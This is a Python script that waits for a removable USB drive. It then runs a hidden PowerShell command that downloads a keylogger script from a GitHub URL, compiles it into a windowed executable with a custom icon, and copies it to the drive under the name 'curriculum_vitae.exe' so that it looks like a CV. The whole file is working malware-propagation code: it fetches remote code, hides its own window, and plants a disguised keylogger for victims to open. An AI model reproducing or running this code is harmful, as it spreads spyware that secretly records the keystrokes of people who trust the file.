
import os
import psutil
import threading

dots = "."

# time interval for sending the data in seconds
timeInterval = 2.0

# url of the script to download
script_url = "https://raw.githubusercontent.com/ezequiel9604/python-scripts/main/python-keylogger/KeyLogger.py"

# stores the windows user name
user_name = psutil.users()[0].name

# path of the icon to use
icon_path = f"C:\\Users\\{user_name}\\Desktop\\icon\\movies.ico"

# stores the path chosen to save the keylogger.txt file
path_to_store = f"C:\\Users\\{user_name}\\AppData\\Local\\Temp"

# checks if (the path chosen to save the keylogger.txt) exists if not creates it
if (os.path.isdir(path_to_store) == False):
    os.mkdir(path_to_store)
    # os.system(f"attrib +h {path_to_store}\keylogger.txt")


def mainFunction():

    global dots
    global icon_path
    global script_url
    global timeInterval
    global path_to_store

    is_saved = False

    # get the USBs available every period of time
    available_disks = psutil.disk_partitions()

    for i in range(len(available_disks)):
        
        # on every loop look for USBs
        if available_disks[i].opts == "rw,removable":

            # download the script from github
            dowload_script_command = f"Invoke-WebRequest -Uri {script_url} -OutFile {path_to_store}\\A4S4D5F6.py;"

            # go to the script's location and compile the script into .exe
            compile_py_command = f"cd {path_to_store}; pyinstaller --windowed --onefile --icon={icon_path} {path_to_store}\\A4S4D5F6.py;"

            # copy the file to the USB 
            move_py_command = f"copy-item {path_to_store}\\dist\\A4S4D5F6.exe {available_disks[i].device}curriculum_vitae.exe;"

            # stop the process
            close_cmd_command = r"Stop-Process -ProcessName cmd;"

            # store all the previous commands
            command_to_execute = f"cmd /c start /min start powershell -WindowStyle Hidden -Command {dowload_script_command} {compile_py_command} {move_py_command} {close_cmd_command}"

            #print(command_to_execute)

            # execute commands
            os.system(command_to_execute)

            is_saved = True

    # once any USB is found stops the program
    if is_saved == False:

        if len(dots) > 9:
            dots= "."

        # prints this message if USB is not found
        os.system("cls")
        print(f"Waiting for user insert usb drive{dots} ")
        dots += "." 

        # creates a new thread and call mainFunction every time interval in seconds
        timer = threading.Timer(timeInterval, mainFunction)
        timer.start()

 
mainFunction()

